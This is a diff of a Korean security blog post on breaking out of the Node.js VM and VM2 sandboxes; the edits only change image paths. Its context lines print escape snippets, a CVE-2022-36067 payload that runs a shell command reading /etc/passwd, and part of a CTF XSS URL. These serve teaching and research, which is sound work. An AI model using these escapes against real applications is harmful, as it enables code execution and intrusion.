@@ -62,7 +62,7 @@ VM 모듈을 사용하면 `process is not defined` 에러 메세지를 확인할
 console.log(process);
 ```
 
-![Untitled](/assets/2023-03-29/Untitled 2.png)
+![Untitled](/assets/2023-03-29/Untitled%202.png)
 
 ```jsx
 // vm_process.js
@@ -73,7 +73,7 @@ var tmp = vm.runInNewContext(`this.constructor.constructor("return process")()`)
 console.log(tmp);
 ```
 
-![Untitled](/assets/2023-03-29/Untitled 3.png)
+![Untitled](/assets/2023-03-29/Untitled%203.png)
 
 직접적으로 process에 접근하는 것은 불가능하나, `this.constructor.constructor("return process")()`를 통해 VM code 외부의 constructor에 접근하고 해당 constructor의 process를 리턴하여 강제로 VM 환경 내에서도 process에 대한 접근을 가능하게 만듭니다.
 
@@ -97,7 +97,7 @@ var tmp = vm.runInNewContext(`this.constructor.constructor("return process")().m
 console.log(tmp);
 ```
 
-![Untitled](/assets/2023-03-29/Untitled 4.png)
+![Untitled](/assets/2023-03-29/Untitled%204.png)
 
 커맨드 인젝션이 가능함을 확인했음에도 불구하고 시스템 명령어 실행이 불가능할 시, 해당 코드를 실행하는 부분을 잘 체크하고 에러코드 등을 확인하여 VM 환경 내에서 동작하는 스크립트라면 위의 방법을 통해 샌드박스 Breakout을 시도해볼 수 있습니다.
 
@@ -105,7 +105,7 @@ console.log(tmp);
 
 아래는 WolvCTF 2023의 Zombie 301, 401 문제 풀이와 unintended 풀이입니다
 
-![Untitled](/assets/2023-03-29/Untitled 5.png)
+![Untitled](/assets/2023-03-29/Untitled%205.png)
 
 문제에서 사용중인 zombie module에서 VM 모듈을 사용하고 있고 저희의 입력 값을 VM.runInContext()로 실행시켜주는 환경이었기 때문에 바로 익스플로잇이 가능하였습니다.
 
@@ -121,9 +121,9 @@ https://zombie-401-tlejfksioa-ul.a.run.app/zombie?show=%3Cscript%3Elocation%3D%2
 
 # Upgraded to Sandbox VM2
 
-![Untitled](/assets/2023-03-29/Untitled 6.png)
+![Untitled](/assets/2023-03-29/Untitled%206.png)
 
-![Untitled](/assets/2023-03-29/Untitled 7.png)
+![Untitled](/assets/2023-03-29/Untitled%207.png)
 
 VM2은 nodejs 코어 모듈 VM에 보안성을 추가하여 제공하는 모듈입니다. 현재도 꾸준히 다양한 우회 기법들을 적극적으로 제보받고 빠르게 보안 패치를 진행하고 있습니다. 대부분의 Security fix는 샌드박스 환경을 breakout하는 취약점에 대한 패치입니다. CHANGELOG를 통해 짧은 시간 동안에도 반복적으로 익스플로잇&패치되고 있는 것을 확인할 수 있습니다.
 
@@ -237,11 +237,11 @@ nvm.run(`
 
 CVE-2022-36067에서는 에러를 발생 시킨 뒤 globalThis.Error.prepareStackTrace, 즉 Error.prepareStackTrace를 통해 불러온 not sandboxed 객체를 활용하였습니다.
 
-![Untitled](/assets/2023-03-29/Untitled 8.png)
+![Untitled](/assets/2023-03-29/Untitled%208.png)
 
 `Error.prepareStackTrace`에 `(err, traces) ⇒ { return stack }` 와 같은 형태로 넣어주면 CallSite 객체의 배열에 대한 접근이 가능합니다. 그 중에서 `getThis()`를 사용하여 샌드박스 환경 밖에 있는 객체를 지정하여 process에 바로 접근하였습니다. 그 결과 `traces[0].getThis().process.mainModule.require('child_process').execSync('cat /etc/passwd > /tmp/pwned');`를 통해 시스템 명령어를 실행할 수 있습니다.
 
-![Untitled](/assets/2023-03-29/Untitled 9.png)
+![Untitled](/assets/2023-03-29/Untitled%209.png)
 
 여기까지 nodejs 환경의 코어 모듈 VM 그리고 VM2에 대해서 알아보았습니다. VM 모듈의 취약성을 VM2에서 다양하게 방어 조치하고 있기 때문에 VM을 바로 사용하지 않고, VM2을 사용하는 것이 상대적으로 안전할 것입니다.
 
